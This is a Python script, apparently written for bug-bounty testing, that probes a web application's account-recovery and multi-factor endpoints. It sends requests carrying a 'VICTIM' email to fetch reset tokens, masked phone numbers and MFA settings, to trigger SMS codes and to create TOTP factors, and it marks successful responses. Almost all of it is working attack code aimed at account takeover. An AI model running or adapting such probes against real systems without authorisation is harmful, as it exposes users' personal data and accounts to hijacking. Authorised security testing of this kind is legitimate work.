import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
VICTIM="golden-leaf-3068@bugcrowdninja.com"
tests=[
 ('POST','/api/v1/users/reset-token-info',{"email":VICTIM}),
 ('POST','/api/v1/users/reset-token-info',{"token":"1"}),
 ('POST','/api/v1/users/reset-token-info',{}),
 ('POST','/api/v1/users/get-masked-phone-number',{"email":VICTIM}),
 ('POST','/api/v1/users/two-factor-methods',{"email":VICTIM}),
 ('GET','/api/v1/users/two-factor-methods',None),
 ('POST','/api/v1/users/mfa-preference',{"email":VICTIM}),
 ('GET','/api/v1/users/mfa-preference',None),
 ('POST','/api/v1/users/send-sms-verification',{"email":VICTIM}),
 ('POST','/api/v1/users/create-totp-factor',{"email":VICTIM}),
]
for m,p,b in tests:
    c,txt=req(m,p,b)
    mark='  <<<' if c in ('200','201','204') else ''
    print(f"{c} {m:5} {p}")
    print(f"      req={json.dumps(b) if b else '-'}")
    print(f"      {txt[:220].replace(chr(10),' ')}{mark}")
